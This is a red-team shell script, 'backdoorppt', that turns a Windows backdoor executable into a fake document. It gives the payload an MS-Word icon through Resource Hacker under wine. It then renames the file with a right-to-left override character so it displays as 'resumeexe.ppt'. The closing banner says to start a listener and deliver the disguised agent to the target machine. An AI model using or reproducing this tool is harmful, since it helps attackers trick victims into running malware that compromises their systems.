#!/bin/sh
###
# backdoorppt - a binary transformation tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.1
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
# codename: strange things happen under windows
#
# Supports wine 32 or 64 bits installations
# 
###




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# variable declarations
# ---------------------
VeR="1.1"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`




# ------------------------
# configuring correct arch
# ------------------------
if [ "$ArCh" = "i686" ]; then
arch="wine"
PgFi="Program Files"
else
arch="wine64"
PgFi="Program Files(x86)"
fi




# -------------
# Tool banner
# ------------
cat << !

    +-+-+-+-+-+-+-+-+-+-+-+
    |b|a|c|k|d|o|o|r|p|p|t|
    +-+-+-+-+-+-+-+-+-+-+-+
 'A binary transformation tool'
 Credits: Damon Mohammadbagher

!


Colors;
echo ${YellowF}[⊶] Checking backend applications! ${Reset};
sleep 1
# ----------------------
# check for dependencies
# ----------------------
apc=`which ruby`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Ruby installation '->' ${RedF}not found! ${Reset};
echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
sleep 1
exit
else
echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} Wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires wine to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} Wine installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi

if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
echo ${BlueF}[☆]${white} Wine Program Files '->' ${GreenF}found! ${Reset};
sleep 1
else
echo ${RedF}[☠]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
winecfg > /dev/null 2>&1
sleep 1
exit
fi




# ------------------------
# start of script funtions
# ------------------------
echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
rUn=$(zenity --question --title="☠ BackdoorPPt ☠" --text "Execute this module?" --width 270) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then


# questions to user
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1

  # wine configurtions (winecfg)
  echo ${BlueF}[☆]${white} Select ${GreenF}windows 7${white} from winecfg ${Reset};
  sleep 2
  winecfg > /dev/null 2>&1
  sleep 1

    # check for resource hacker installation (wine)
    if [ -f "$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe" ]; then
      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
      sleep 1
    else
      echo ${RedF}[☠]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
      sleep 1
      echo ${BlueF}[☆]${white} Installing ResourceHacker under .wine directory ${Reset};
      xterm -T "BackdoorPPt" -geometry 90x26 -e "$arch $IPATH/reshacker_setup.exe && sleep 3"
    fi

      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
      echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/backdoor.exe -action addskip -res $IPATH/MS-Word-32x32.ico -mask ICONGROUP,MAINICON,
      echo ${BlueF}[☆]${white} Change backdoor agent icon '->' ${GreenF}done... ${Reset};
      sleep 1

    # insert .ppt hidden extension
    echo ${BlueF}[☆]${white} Adding agent hidden extension '->' ${GreenF}done... ${Reset};
    mv $IPATH/backdoor.exe  $IPATH/backdoor_ppt.exe > /dev/null 2>&1
    sleep 1

  cd $IPATH
  # rename backdoor name
  echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
  ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
  sleep 1


# -----------------------------
# Display final output to user
# -----------------------------
cat << !

    Final file  : $IPATH/resumeexe.ppt
    Credits     : Damon Mohammadbagher
    Tool Author : r00t-3xp10it (SSA redTeam)

    Your backdoor agent its now transformed into one fake
    word doc (ppt) remmenber that .exe extensions will not
    be 'visible' under windows systems, because the system
    default behavior its: NOT show hidden extensions...

    We are now ready to start a handler (listener) and
    deliver the transformed agent to the target machine.

!

# The user dont want to run the tool
# aborted switch..
else
  echo ${RedF}[x]${white} Abort all tasks${RedF}!${Reset};
  sleep 2
fi
# exit
exit
